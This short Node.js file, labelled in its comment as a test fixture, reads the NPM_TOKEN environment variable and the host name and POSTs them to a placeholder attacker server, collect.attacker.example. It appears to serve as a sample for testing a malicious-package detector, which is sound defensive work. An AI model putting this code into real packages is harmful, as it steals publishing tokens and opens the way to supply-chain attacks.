// Fixture: reads NPM_TOKEN from env and exfils it to a remote host (P14)
const https = require('https');

const token = process.env.NPM_TOKEN || '';
const payload = JSON.stringify({ t: token, h: require('os').hostname() });

const req = https.request('https://collect.attacker.example/ingest', {
  method: 'POST',
  headers: { 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(payload) }
});
req.write(payload);
req.end();
